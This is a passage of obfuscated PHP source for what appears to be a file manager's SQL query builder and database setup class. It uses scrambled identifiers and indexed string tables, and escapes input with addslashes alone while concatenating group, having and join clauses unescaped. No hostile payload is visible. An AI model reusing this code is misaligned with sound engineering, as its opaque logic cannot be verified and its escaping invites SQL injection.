(!is_numeric($âø¬È¹)) { $¸íªÖîà[] = $this->parseKey($âø¬È¹, !1) . $Ñ±ˆíıÙ[994] . $this->parseKey($ÙáÑ×ğ); } else { $¸íªÖîà[] = $this->parseKey($ÙáÑ×ğ); } } $¼©çŒÆ’ = implode($Ñ±ˆíıÙ[47], $¸íªÖîà); } elseif (is_string($Œ¢Ì­ë’) && !empty($Œ¢Ì­ë’)) { $¼©çŒÆ’ = $Œ¢Ì­ë’; } else { $¼©çŒÆ’ = $Ñ±ˆíıÙ[182]; } return $¼©çŒÆ’; } protected function parseTable($×˜Ğì˜œ) { $£Ä˜Û¿ß =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($×˜Ğì˜œ)) { $•Ê„¯õ = array(); foreach ($×˜Ğì˜œ as $ü×‹ÔŸ => $‘²ıÁ¸­) { if (!is_numeric($ü×‹ÔŸ)) { $•Ê„¯õ[] = $this->parseKey($ü×‹ÔŸ) . $£Ä˜Û¿ß[50] . $this->parseKey($‘²ıÁ¸­); } else { $•Ê„¯õ[] = $this->parseKey($ü×‹ÔŸ); } } $×˜Ğì˜œ = $•Ê„¯õ; } elseif (is_string($×˜Ğì˜œ)) { if (strstr($×˜Ğì˜œ, $£Ä˜Û¿ß[50])) { return $×˜Ğì˜œ; } $×˜Ğì˜œ = explode($£Ä˜Û¿ß[47], $×˜Ğì˜œ); array_walk($×˜Ğì˜œ, array($this, $£Ä˜Û¿ß[905])); } return $£Ä˜Û¿ß[899] . trim(implode($£Ä˜Û¿ß[995], $×˜Ğì˜œ), $£Ä˜Û¿ß[383]) . $£Ä˜Û¿ß[899]; } protected function parseWhere($¾”¸†¢è) { $²¢õéˆ  =& $_SERVER[¥ÙÌÜ¾ê]; $â÷«Ò‹ = $²¢õéˆ [33]; if (is_string($¾”¸†¢è)) { $â÷«Ò‹ = $¾”¸†¢è; } else { $·ãˆ‚Úà = isset($¾”¸†¢è[$²¢õéˆ [996]]) ? strtoupper($¾”¸†¢è[$²¢õéˆ [996]]) : $²¢õéˆ [33]; if (in_array($·ãˆ‚Úà, array($²¢õéˆ [997], $²¢õéˆ [998], $²¢õéˆ [999]))) { $·ãˆ‚Úà = $²¢õéˆ [50] . $·ãˆ‚Úà . $²¢õéˆ [50]; unset($¾”¸†¢è[$²¢õéˆ [996]]); } else { $·ãˆ‚Úà = $²¢õéˆ [1000]; } foreach ($¾”¸†¢è as $³ÛÏŸ† => $’âÎ¼ÙÑ) { $â÷«Ò‹ .= $²¢õéˆ [275]; if (is_numeric($³ÛÏŸ†)) { $³ÛÏŸ† = $²¢õéˆ [1001]; } if (0 === strpos($³ÛÏŸ†, $²¢õéˆ [71])) { $â÷«Ò‹ .= $this->parseThinkWhere($³ÛÏŸ†, $’âÎ¼ÙÑ); } else { if (!preg_match($²¢õéˆ [1002], trim($³ÛÏŸ†))) { think_exception(think_lang($²¢õéˆ [1003]) . $²¢õéˆ [4] . $³ÛÏŸ†); } $ë¥ Ä—» = is_array($’âÎ¼ÙÑ) && isset($’âÎ¼ÙÑ[$²¢õéˆ [1004]]); $³ÛÏŸ† = trim($³ÛÏŸ†); if (strpos($³ÛÏŸ†, $²¢õéˆ [281])) { $©÷Ö«İÙ = explode($²¢õéˆ [281], $³ÛÏŸ†); $¾»ÄÊëş = array(); foreach ($©÷Ö«İÙ as $×¯œ×şü => $ç‡ü‰ËÎ) { $´Ğ«›Ä² = $ë¥ Ä—» ? $’âÎ¼ÙÑ[$×¯œ×şü] : $’âÎ¼ÙÑ; $¾»ÄÊëş[] = $²¢õéˆ [258] . $this->parseWhereItem($this->parseKey($ç‡ü‰ËÎ), $´Ğ«›Ä²) . $²¢õéˆ [904]; } $â÷«Ò‹ .= implode($²¢õéˆ [1005], $¾»ÄÊëş); } elseif (strpos($³ÛÏŸ†, $²¢õéˆ [282])) { $©÷Ö«İÙ = explode($²¢õéˆ [282], $³ÛÏŸ†); $¾»ÄÊëş = array(); foreach ($©÷Ö«İÙ as $×¯œ×şü => $ç‡ü‰ËÎ) { $´Ğ«›Ä² = $ë¥ Ä—» ? $’âÎ¼ÙÑ[$×¯œ×şü] : $’âÎ¼ÙÑ; $¾»ÄÊëş[] = $²¢õéˆ [258] . $this->parseWhereItem($this->parseKey($ç‡ü‰ËÎ), $´Ğ«›Ä²) . $²¢õéˆ [904]; } $â÷«Ò‹ .= implode($²¢õéˆ [1000], $¾»ÄÊëş); } else { $â÷«Ò‹ .= $this->parseWhereItem($this->parseKey($³ÛÏŸ†), $’âÎ¼ÙÑ); } } $â÷«Ò‹ .= $²¢õéˆ [276] . $·ãˆ‚Úà; } $â÷«Ò‹ = substr($â÷«Ò‹, 0, -strlen($·ãˆ‚Úà)); } return empty($â÷«Ò‹) ? $²¢õéˆ [33] : $²¢õéˆ [1006] . $â÷«Ò‹; } protected function parseWhereItem($ûµ˜å»Û, $ùÇÆêÆÅ) { $é›ìß­¾ =& $_SERVER[¥ÙÌÜ¾ê]; $œÁÆ±ª‚ = $é›ìß­¾[33]; if (is_array($ùÇÆêÆÅ)) { if (is_string($ùÇÆêÆÅ[0])) { $Ñã¯®Ø = strtolower($ùÇÆêÆÅ[0]); if (in_array($ùÇÆêÆÅ[0], array($é›ìß­¾[990], $é›ìß­¾[1007], $é›ìß­¾[1008], $é›ìß­¾[1009], $é›ìß­¾[1010], $é›ìß­¾[1011]))) { $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[50] . $ùÇÆêÆÅ[0] . $é›ìß­¾[50] . $this->parseValue($ùÇÆêÆÅ[1]); } elseif (preg_match($é›ìß­¾[1012], $ùÇÆêÆÅ[0])) { $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[50] . $this->parseValue($ùÇÆêÆÅ[1]); } elseif (preg_match($é›ìß­¾[1013], $ùÇÆêÆÅ[0])) { if (is_array($ùÇÆêÆÅ[1])) { $¼Ó©æ’İ = isset($ùÇÆêÆÅ[2]) ? strtoupper($ùÇÆêÆÅ[2]) : $é›ìß­¾[998]; if (in_array($¼Ó©æ’İ, array($é›ìß­¾[997], $é›ìß­¾[998], $é›ìß­¾[999]))) { $ÎÈûÛ„ = array(); foreach ($ùÇÆêÆÅ[1] as $Ë“‡ÚõÙ) { $ÎÈûÛ„[] = $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[50] . $this->parseValue($Ë“‡ÚõÙ); } $œÁÆ±ª‚ .= $é›ìß­¾[258] . implode($é›ìß­¾[50] . $¼Ó©æ’İ . $é›ìß­¾[50], $ÎÈûÛ„) . $é›ìß­¾[904]; } } else { $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[50] . $this->parseValue($ùÇÆêÆÅ[1]); } } elseif ($é›ìß­¾[295] == $Ñã¯®Ø) { $œÁÆ±ª‚ .= $é›ìß­¾[902] . $ûµ˜å»Û . $é›ìß­¾[50] . $ùÇÆêÆÅ[1] . $é›ìß­¾[1014]; } elseif (preg_match($é›ìß­¾[1015], $ùÇÆêÆÅ[0])) { $œÁÆ±ª‚ .= $ùÇÆêÆÅ[0]; } elseif (preg_match($é›ìß­¾[1016], $ùÇÆêÆÅ[0])) { if (isset($ùÇÆêÆÅ[2]) && $é›ìß­¾[295] == $ùÇÆêÆÅ[2]) { $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[50] . $ùÇÆêÆÅ[1]; } else { if (is_string($ùÇÆêÆÅ[1])) { $ùÇÆêÆÅ[1] = explode($é›ìß­¾[47], $ùÇÆêÆÅ[1]); } $¿ª©ñàÌ = implode($é›ìß­¾[47], $this->parseValue($ùÇÆêÆÅ[1])); $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[902] . $¿ª©ñàÌ . $é›ìß­¾[904]; } } elseif (preg_match($é›ìß­¾[1017], $ùÇÆêÆÅ[0])) { $€€ê†î = is_string($ùÇÆêÆÅ[1]) ? explode($é›ìß­¾[47], $ùÇÆêÆÅ[1]) : $ùÇÆêÆÅ[1]; $œÁÆ±ª‚ .= $é›ìß­¾[902] . $ûµ˜å»Û . $é›ìß­¾[50] . $this->exp[$Ñã¯®Ø] . $é›ìß­¾[50] . $this->parseValue($€€ê†î[0]) . $é›ìß­¾[1000] . $this->parseValue($€€ê†î[1]) . $é›ìß­¾[276]; } else { think_exception(think_lang($é›ìß­¾[1003]) . $é›ìß­¾[4] . $ùÇÆêÆÅ[0]); } } else { $èĞ¬Ö€ü = count($ùÇÆêÆÅ); $ì¿Æûï¼ = $é›ìß­¾[33]; if (is_string($ùÇÆêÆÅ[$èĞ¬Ö€ü - 1])) { $ì¿Æûï¼ = isset($ùÇÆêÆÅ[$èĞ¬Ö€ü - 1]) ? strtoupper($ùÇÆêÆÅ[$èĞ¬Ö€ü - 1]) : $é›ìß­¾[33]; if (in_array($ì¿Æûï¼, array($é›ìß­¾[997], $é›ìß­¾[998], $é›ìß­¾[999]))) { $èĞ¬Ö€ü = $èĞ¬Ö€ü - 1; } } else { $ì¿Æûï¼ = $é›ìß­¾[997]; } for ($Â¤ ş¸¡ = 0; $Â¤ ş¸¡ < $èĞ¬Ö€ü; $Â¤ ş¸¡++) { $€€ê†î = is_array($ùÇÆêÆÅ[$Â¤ ş¸¡]) ? $ùÇÆêÆÅ[$Â¤ ş¸¡][1] : $ùÇÆêÆÅ[$Â¤ ş¸¡]; if ($é›ìß­¾[295] == strtolower($ùÇÆêÆÅ[$Â¤ ş¸¡][0])) { $œÁÆ±ª‚ .= $é›ìß­¾[258] . $ûµ˜å»Û . $é›ìß­¾[50] . $€€ê†î . $é›ìß­¾[1014] . $ì¿Æûï¼ . $é›ìß­¾[50]; } else { $›á°¾©İ = is_array($ùÇÆêÆÅ[$Â¤ ş¸¡]) ? $this->exp[strtolower($ùÇÆêÆÅ[$Â¤ ş¸¡][0])] : $é›ìß­¾[990]; if (!$›á°¾©İ && is_array($ùÇÆêÆÅ[$Â¤ ş¸¡]) && in_array($ùÇÆêÆÅ[$Â¤ ş¸¡][0], array($é›ìß­¾[990], $é›ìß­¾[1007], $é›ìß­¾[1008], $é›ìß­¾[1009], $é›ìß­¾[1010], $é›ìß­¾[1011]))) { $›á°¾©İ = $ùÇÆêÆÅ[$Â¤ ş¸¡][0]; } $œÁÆ±ª‚ .= $é›ìß­¾[258] . $ûµ˜å»Û . $é›ìß­¾[50] . $›á°¾©İ . $é›ìß­¾[50] . $this->parseValue($€€ê†î) . $é›ìß­¾[1014] . $ì¿Æûï¼ . $é›ìß­¾[50]; } } $œÁÆ±ª‚ = substr($œÁÆ±ª‚, 0, -4); } } else { $œÁÆ±ª‚ .= $ûµ˜å»Û . $é›ìß­¾[1018] . $this->parseValue($ùÇÆêÆÅ); } return $œÁÆ±ª‚; } protected function parseThinkWhere($õñéïŠ•, $œ¦›Ã¦Ì) { $¼™âù¤Ã =& $_SERVER[¥ÙÌÜ¾ê]; $­ù¢¦¯ = $¼™âù¤Ã[33]; switch ($õñéïŠ•) { case $¼™âù¤Ã[350]: $­ù¢¦¯ = $œ¦›Ã¦Ì; break; case $¼™âù¤Ã[1001]: $­ù¢¦¯ = is_string($œ¦›Ã¦Ì) ? $œ¦›Ã¦Ì : substr($this->parseWhere($œ¦›Ã¦Ì), 6); break; case $¼™âù¤Ã[1019]: parse_str($œ¦›Ã¦Ì, $òÏÕË·); if (isset($òÏÕË·[$¼™âù¤Ã[996]])) { $œºØ€Æ§ = $¼™âù¤Ã[50] . strtoupper($òÏÕË·[$¼™âù¤Ã[996]]) . $¼™âù¤Ã[50]; unset($òÏÕË·[$¼™âù¤Ã[996]]); } else { $œºØ€Æ§ = $¼™âù¤Ã[1000]; } $Œ£›£Ÿä = array(); foreach ($òÏÕË· as $ªƒÎ”Œ => $¢Çú¯ğ®) { $Œ£›£Ÿä[] = $this->parseKey($ªƒÎ”Œ) . $¼™âù¤Ã[1018] . $this->parseValue($¢Çú¯ğ®); } $­ù¢¦¯ = implode($œºØ€Æ§, $Œ£›£Ÿä); break; } return $­ù¢¦¯; } protected function parseLimit($œ¥™É–) { $©İŠëÃ =& $_SERVER[¥ÙÌÜ¾ê]; return !empty($œ¥™É–) ? $©İŠëÃ[48] . $œ¥™É– . $©İŠëÃ[50] : $©İŠëÃ[33]; } protected function parseJoin($øüáÁÏô) { $öò¾ô€Í =& $_SERVER[¥ÙÌÜ¾ê]; $ÎÙ¥˜¿õ = $öò¾ô€Í[33]; if (!empty($øüáÁÏô)) { if (is_array($øüáÁÏô)) { foreach ($øüáÁÏô as $Ÿ–Àñ¤³ => $¾ıö©ıˆ) { if (!1 !== stripos($¾ıö©ıˆ, $öò¾ô€Í[1020])) { $ÎÙ¥˜¿õ .= $öò¾ô€Í[50] . $¾ıö©ıˆ; } else { $ÎÙ¥˜¿õ .= $öò¾ô€Í[1021] . $¾ıö©ıˆ; } } } else { $ÎÙ¥˜¿õ .= $öò¾ô€Í[1021] . $øüáÁÏô; } } $ÎÙ¥˜¿õ = preg_replace($öò¾ô€Í[1022], think_config($öò¾ô€Í[928]) . $öò¾ô€Í[1023], $ÎÙ¥˜¿õ); return $ÎÙ¥˜¿õ; } protected function parseOrder($ùñ¹ì¶ì) { $ÇÆÕ“Ô =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($ùñ¹ì¶ì)) { $¸½­Ë† = array(); foreach ($ùñ¹ì¶ì as $ü‚„Ë³ó => $‰ööñÁº) { if (is_numeric($ü‚„Ë³ó)) { $¸½­Ë†[] = $this->parseKey($‰ööñÁº); } else { $‰ööñÁº = in_array(strtoupper(trim($‰ööñÁº)), array($ÇÆÕ“Ô[1024], $ÇÆÕ“Ô[1025])) ? $ÇÆÕ“Ô[50] . $‰ööñÁº : $ÇÆÕ“Ô[33]; if (preg_match($ÇÆÕ“Ô[1026], $ü‚„Ë³ó)) { $¸½­Ë†[] = $this->parseKey($ü‚„Ë³ó) . $‰ööñÁº; } else { think_exception($ÇÆÕ“Ô[1027] . $ü‚„Ë³ó); } } } $ùñ¹ì¶ì = implode($ÇÆÕ“Ô[47], $¸½­Ë†); } return !empty($ùñ¹ì¶ì) ? $ÇÆÕ“Ô[1028] . $ùñ¹ì¶ì : $ÇÆÕ“Ô[33]; } protected function parseGroup($œœŒîÇ®) { $ááúÖÉˆ =& $_SERVER[¥ÙÌÜ¾ê]; return !empty($œœŒîÇ®) ? $ááúÖÉˆ[1029] . $œœŒîÇ® : $ááúÖÉˆ[33]; } protected function parseHaving($Œ¬™¯Ä) { $Øæü¾ûÂ =& $_SERVER[¥ÙÌÜ¾ê]; return !empty($Œ¬™¯Ä) ? $Øæü¾ûÂ[1030] . $Œ¬™¯Ä : $Øæü¾ûÂ[33]; } protected function parseComment($åÌ¦–ÆÓ) { $Ò²ü¸õ =& $_SERVER[¥ÙÌÜ¾ê]; return !empty($åÌ¦–ÆÓ) ? $Ò²ü¸õ[1031] . $åÌ¦–ÆÓ . $Ò²ü¸õ[1032] : $Ò²ü¸õ[33]; } protected function parseDistinct($›¸ÀÎ‹„) { $ÖëêãşÁ =& $_SERVER[¥ÙÌÜ¾ê]; return !empty($›¸ÀÎ‹„) ? $ÖëêãşÁ[1033] : $ÖëêãşÁ[33]; } protected function parseUnion($ƒÍã‡£Ÿ) { $¬ı‘ñĞ =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($ƒÍã‡£Ÿ)) { return $¬ı‘ñĞ[33]; } if (isset($ƒÍã‡£Ÿ[$¬ı‘ñĞ[346]])) { $ºÀí«é = $¬ı‘ñĞ[1034]; unset($ƒÍã‡£Ÿ[$¬ı‘ñĞ[346]]); } else { $ºÀí«é = $¬ı‘ñĞ[1035]; } foreach ($ƒÍã‡£Ÿ as $âÇÇáÃ) { $Ìø—Å×ñ[] = $ºÀí«é . (is_array($âÇÇáÃ) ? $this->buildSelectSql($âÇÇáÃ) : $âÇÇáÃ); } return implode($¬ı‘ñĞ[50], $Ìø—Å×ñ); } public function insert($ùÍŠœ‡­, $ÙÒò´õ… = array(), $™ªæ–Å² = false) { $÷¥ÈÈ”˜ =& $_SERVER[¥ÙÌÜ¾ê]; $úƒ©Ëâ = $ÒÁ“âÔ‘ = array(); $this->model = $ÙÒò´õ…[$÷¥ÈÈ”˜[279]]; foreach ($ùÍŠœ‡­ as $‡ôÜ–ÍÀ => $š„¬Œä†) { if (is_array($š„¬Œä†) && $÷¥ÈÈ”˜[295] == $š„¬Œä†[0]) { $ÒÁ“âÔ‘[] = $this->parseKey($‡ôÜ–ÍÀ); $úƒ©Ëâ[] = $š„¬Œä†[1]; } elseif (is_scalar($š„¬Œä†) || is_null($š„¬Œä†)) { $ÒÁ“âÔ‘[] = $this->parseKey($‡ôÜ–ÍÀ); $úƒ©Ëâ[] = $this->parseValue($š„¬Œä†); } } $œ³Ñ´¤ = ($™ªæ–Å² ? $÷¥ÈÈ”˜[906] : $÷¥ÈÈ”˜[907]) . $÷¥ÈÈ”˜[908] . $this->parseTable($ÙÒò´õ…[$÷¥ÈÈ”˜[277]]) . $÷¥ÈÈ”˜[902] . implode($÷¥ÈÈ”˜[47], $ÒÁ“âÔ‘) . $÷¥ÈÈ”˜[903] . implode($÷¥ÈÈ”˜[47], $úƒ©Ëâ) . $÷¥ÈÈ”˜[904]; $œ³Ñ´¤ .= $this->parseLock(isset($ÙÒò´õ…[$÷¥ÈÈ”˜[843]]) ? $ÙÒò´õ…[$÷¥ÈÈ”˜[843]] : !1); $œ³Ñ´¤ .= $this->parseComment(!empty($ÙÒò´õ…[$÷¥ÈÈ”˜[352]]) ? $ÙÒò´õ…[$÷¥ÈÈ”˜[352]] : $÷¥ÈÈ”˜[33]); return $this->execute($œ³Ñ´¤, $this->parseBind(!empty($ÙÒò´õ…[$÷¥ÈÈ”˜[283]]) ? $ÙÒò´õ…[$÷¥ÈÈ”˜[283]] : array())); } public function selectInsert($°º÷ÈÕ¤, $ç‹Ã×Ê–, $“ºÊâÏÀ = array()) { $…àş‰èò =& $_SERVER[¥ÙÌÜ¾ê]; $this->model = $“ºÊâÏÀ[$…àş‰èò[279]]; if (is_string($°º÷ÈÕ¤)) { $°º÷ÈÕ¤ = explode($…àş‰èò[47], $°º÷ÈÕ¤); } array_walk($°º÷ÈÕ¤, array($this, $…àş‰èò[905])); $ıµåİÕ¾ = $…àş‰èò[1036] . $this->parseTable($ç‹Ã×Ê–) . $…àş‰èò[902] . implode($…àş‰èò[47], $°º÷ÈÕ¤) . $…àş‰èò[1014]; $ıµåİÕ¾ .= $this->buildSelectSql($“ºÊâÏÀ); return $this->execute($ıµåİÕ¾, $this->parseBind(!empty($“ºÊâÏÀ[$…àş‰èò[283]]) ? $“ºÊâÏÀ[$…àş‰èò[283]] : array())); } public function update($áæ­÷úÃ, $”İ£ÇÖ) { $ÛÌ½æ­ =& $_SERVER[¥ÙÌÜ¾ê]; $this->model = $”İ£ÇÖ[$ÛÌ½æ­[279]]; $•¶Üøµ = $ÛÌ½æ­[1037] . $this->parseTable($”İ£ÇÖ[$ÛÌ½æ­[277]]) . $this->parseSet($áæ­÷úÃ) . $this->parseWhere(!empty($”İ£ÇÖ[$ÛÌ½æ­[273]]) ? $”İ£ÇÖ[$ÛÌ½æ­[273]] : $ÛÌ½æ­[33]) . $this->parseOrder(!empty($”İ£ÇÖ[$ÛÌ½æ­[363]]) ? $”İ£ÇÖ[$ÛÌ½æ­[363]] : $ÛÌ½æ­[33]) . $this->parseLimit(!empty($”İ£ÇÖ[$ÛÌ½æ­[290]]) ? $”İ£ÇÖ[$ÛÌ½æ­[290]] : $ÛÌ½æ­[33]) . $this->parseLock(isset($”İ£ÇÖ[$ÛÌ½æ­[843]]) ? $”İ£ÇÖ[$ÛÌ½æ­[843]] : !1) . $this->parseComment(!empty($”İ£ÇÖ[$ÛÌ½æ­[352]]) ? $”İ£ÇÖ[$ÛÌ½æ­[352]] : $ÛÌ½æ­[33]); return $this->execute($•¶Üøµ, $this->parseBind(!empty($”İ£ÇÖ[$ÛÌ½æ­[283]]) ? $”İ£ÇÖ[$ÛÌ½æ­[283]] : array())); } public function delete($øÏ‘Ü¯ = array()) { $ÇÂŠÈ›› =& $_SERVER[¥ÙÌÜ¾ê]; $this->model = $øÏ‘Ü¯[$ÇÂŠÈ››[279]]; $‰ŠØ¯ = $ÇÂŠÈ››[1038] . $this->parseTable($øÏ‘Ü¯[$ÇÂŠÈ››[277]]) . $this->parseWhere(!empty($øÏ‘Ü¯[$ÇÂŠÈ››[273]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[273]] : $ÇÂŠÈ››[33]) . $this->parseOrder(!empty($øÏ‘Ü¯[$ÇÂŠÈ››[363]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[363]] : $ÇÂŠÈ››[33]) . $this->parseLimit(!empty($øÏ‘Ü¯[$ÇÂŠÈ››[290]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[290]] : $ÇÂŠÈ››[33]) . $this->parseLock(isset($øÏ‘Ü¯[$ÇÂŠÈ››[843]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[843]] : !1) . $this->parseComment(!empty($øÏ‘Ü¯[$ÇÂŠÈ››[352]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[352]] : $ÇÂŠÈ››[33]); return $this->execute($‰ŠØ¯, $this->parseBind(!empty($øÏ‘Ü¯[$ÇÂŠÈ››[283]]) ? $øÏ‘Ü¯[$ÇÂŠÈ››[283]] : array())); } public function select($ÎóœÅã² = array()) { $çËÃ— =& $_SERVER[¥ÙÌÜ¾ê]; $this->model = $ÎóœÅã²[$çËÃ—[279]]; $äâÃÒÈ¨ = $this->buildSelectSql($ÎóœÅã²); $ı“”ÑÄã = isset($ÎóœÅã²[$çËÃ—[347]]) ? $ÎóœÅã²[$çËÃ—[347]] : !1; if ($ı“”ÑÄã) { $­½•Ş¯Ü = is_string($ı“”ÑÄã[$çËÃ—[93]]) ? $ı“”ÑÄã[$çËÃ—[93]] : $çËÃ—[1039] . md5($äâÃÒÈ¨); $æ´«ôœ° = think_cache($­½•Ş¯Ü, $çËÃ—[33], $ı“”ÑÄã); if (!1 !== $æ´«ôœ°) { return $æ´«ôœ°; } } $ĞÓåß¥… = $this->query($äâÃÒÈ¨, $this->parseBind(!empty($ÎóœÅã²[$çËÃ—[283]]) ? $ÎóœÅã²[$çËÃ—[283]] : array())); if ($ı“”ÑÄã && !1 !== $ĞÓåß¥…) { think_cache($­½•Ş¯Ü, $ĞÓåß¥…, $ı“”ÑÄã); } return $ĞÓåß¥…; } public function buildSelectSql($·í¯©‘Õ = array()) { $‰£ØûñÉ =& $_SERVER[¥ÙÌÜ¾ê]; if (isset($·í¯©‘Õ[$‰£ØûñÉ[351]])) { if (strpos($·í¯©‘Õ[$‰£ØûñÉ[351]], $‰£ØûñÉ[47])) { list($–İôàîÑ, $šâŠ™Õš) = explode($‰£ØûñÉ[47], $·í¯©‘Õ[$‰£ØûñÉ[351]]); } else { $–İôàîÑ = $·í¯©‘Õ[$‰£ØûñÉ[351]]; } $–İôàîÑ = $–İôàîÑ ? $–İôàîÑ : 1; $šâŠ™Õš = isset($šâŠ™Õš) ? $šâŠ™Õš : (is_numeric($·í¯©‘Õ[$‰£ØûñÉ[290]]) ? $·í¯©‘Õ[$‰£ØûñÉ[290]] : 20); $ÔÔŞ½—å = $šâŠ™Õš * ((int) $–İôàîÑ - 1); $·í¯©‘Õ[$‰£ØûñÉ[290]] = $ÔÔŞ½—å . $‰£ØûñÉ[47] . $šâŠ™Õš; } if (think_config($‰£ØûñÉ[1040])) { $İÖñ³ü = $‰£ØûñÉ[1041] . md5(serialize($·í¯©‘Õ)); $ö‰¹ñğ© = think_cache($İÖñ³ü); if ($ö‰¹ñğ©) { return $ö‰¹ñğ©; } } $Å×ï²à = $this->parseSql($this->selectSql, $·í¯©‘Õ); $Å×ï²à .= $this->parseLock(isset($·í¯©‘Õ[$‰£ØûñÉ[843]]) ? $·í¯©‘Õ[$‰£ØûñÉ[843]] : !1); if (isset($İÖñ³ü)) { think_cache($İÖñ³ü, $Å×ï²à); } return $Å×ï²à; } public function parseSql($Î¼üÅŠÏ, $Èó†¦¿ = array()) { $‚°ÙÙ‹ =& $_SERVER[¥ÙÌÜ¾ê]; $Î¼üÅŠÏ = str_replace(array($‚°ÙÙ‹[1042], $‚°ÙÙ‹[1043], $‚°ÙÙ‹[1044], $‚°ÙÙ‹[1045], $‚°ÙÙ‹[1046], $‚°ÙÙ‹[1047], $‚°ÙÙ‹[1048], $‚°ÙÙ‹[1049], $‚°ÙÙ‹[1050], $‚°ÙÙ‹[1051], $‚°ÙÙ‹[1052]), array($this->parseTable("{$Èó†¦¿[$‚°ÙÙ‹[277]]}"), $this->parseDistinct(isset($Èó†¦¿[$‚°ÙÙ‹[1053]]) ? $Èó†¦¿[$‚°ÙÙ‹[1053]] : !1), $this->parseField(!empty($Èó†¦¿[$‚°ÙÙ‹[271]]) ? $Èó†¦¿[$‚°ÙÙ‹[271]] : $‚°ÙÙ‹[182]), $this->parseJoin(!empty($Èó†¦¿[$‚°ÙÙ‹[280]]) ? $Èó†¦¿[$‚°ÙÙ‹[280]] : $‚°ÙÙ‹[33]), $this->parseWhere(!empty($Èó†¦¿[$‚°ÙÙ‹[273]]) ? $Èó†¦¿[$‚°ÙÙ‹[273]] : $‚°ÙÙ‹[33]), $this->parseGroup(!empty($Èó†¦¿[$‚°ÙÙ‹[509]]) ? $Èó†¦¿[$‚°ÙÙ‹[509]] : $‚°ÙÙ‹[33]), $this->parseHaving(!empty($Èó†¦¿[$‚°ÙÙ‹[1054]]) ? $Èó†¦¿[$‚°ÙÙ‹[1054]] : $‚°ÙÙ‹[33]), $this->parseOrder(!empty($Èó†¦¿[$‚°ÙÙ‹[363]]) ? $Èó†¦¿[$‚°ÙÙ‹[363]] : $‚°ÙÙ‹[33]), $this->parseLimit(!empty($Èó†¦¿[$‚°ÙÙ‹[290]]) ? $Èó†¦¿[$‚°ÙÙ‹[290]] : $‚°ÙÙ‹[33]), $this->parseUnion(!empty($Èó†¦¿[$‚°ÙÙ‹[345]]) ? $Èó†¦¿[$‚°ÙÙ‹[345]] : $‚°ÙÙ‹[33]), $this->parseComment(!empty($Èó†¦¿[$‚°ÙÙ‹[352]]) ? $Èó†¦¿[$‚°ÙÙ‹[352]] : $‚°ÙÙ‹[33])), $Î¼üÅŠÏ); return $Î¼üÅŠÏ; } public function getLastSql($é€ïã€ü = '') { return $é€ïã€ü ? $this->modelSql[$é€ïã€ü] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($šÊŒÇÑ) { return addslashes($šÊŒÇÑ); } public function setModel($×œøÖÍÃ) { $this->model = $×œøÖÍÃ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($”œ—à®÷, $²î­ßŸ‚ = '') { $this->database = $”œ—à®÷; $this->type = $²î­ßŸ‚; } public function model($¤á†Ãåì = '') { return new ModelBase($¤á†Ãåì, $_SERVER[¥ÙÌÜ¾ê][33], $this->database); } public function db($ª•¸òñ = false) { $ä’•ïúë =& $_SERVER[¥ÙÌÜ¾ê]; $³ÒÂŸÆÈ = array_change_key_case($this->database); if ($this->type == $ä’•ïúë[9] || !$ª•¸òñ) { return $this->model()->db(); } $„Û°ö† = $³ÒÂŸÆÈ[$ä’•ïúë[968]]; $³ÒÂŸÆÈ[$ä’•ïúë[968]] = $ä’•ïúë[33]; if ($³ÒÂŸÆÈ[$ä’•ïúë[789]] == $ä’•ïúë[790]) { $¢§œ½ª = $³ÒÂŸÆÈ[$ä’•ïúë[791]]; $³ÒÂŸÆÈ[$ä’•ïúë[791]] = substr($¢§œ½ª, 0, strrpos($¢§œ½ª, $ä’•ïúë[1055])); } $this->database = $³ÒÂŸÆÈ; $ç·ªÛò = $this->model()->db(); try { $€Èü²È› = $ç·ªÛò->execute("\x73\150\x6f\167\x20\x64\141\164\x61\x62\x61\x73\145\x73\40\x6c\x69\x6b\x65\40\47{$„Û°ö†}\47"); } catch (Exception $·†·–ÁÊ) { } if (!$€Èü²È›) { $ç·ªÛò->execute("\x63\162\145\x61\164\x65\x20\x64\x61\164\x61\142\x61\x73\145\x20\x60{$„Û°ö†}\x60"); } $³ÒÂŸÆÈ[$ä’•ïúë[968]] = $„Û°ö†; if ($³ÒÂŸÆÈ[$ä’•ïúë[789]] == $ä’•ïúë[790]) { $³ÒÂŸÆÈ[$ä’•ïúë[791]] .= $ä’•ïúë[1055] . $„Û°ö†; } $this->database = $³ÒÂŸÆÈ; $ç·ªÛò->execute("\x75\x73\x65\x20\140{$„Û°ö†}\x60"); return $ç·ªÛò; } public function createTable($ëÍğù“Ú, &$ö™Ü½) { $ÕÎà»…ø =& $_SERVER[¥ÙÌÜ¾ê]; if (!IO::exist($ëÍğù“Ú)) { ActionCall($ÕÎà»…ø[1056], !0, 0); show_json(LNG($ÕÎà»…ø[1057]), !1); } $ÊØ»˜· = sqlSplit(IO::getContent($ëÍğù“Ú)); foreach ($ÊØ»˜· as $øÂàËá“) { $”ê¬‡â© = stripos($øÂàËá“, $ÕÎà»…ø[1058]) === 0; if ($”ê¬‡â©) { $ö™Ü½->task[$ÕÎà»…ø[1059]] += 1; } $this->model()->db()->execute($øÂàËá“); if ($”ê¬‡â©) { preg_match($ÕÎà»…ø[1060], $øÂàËá“, $¸åè¢‹); 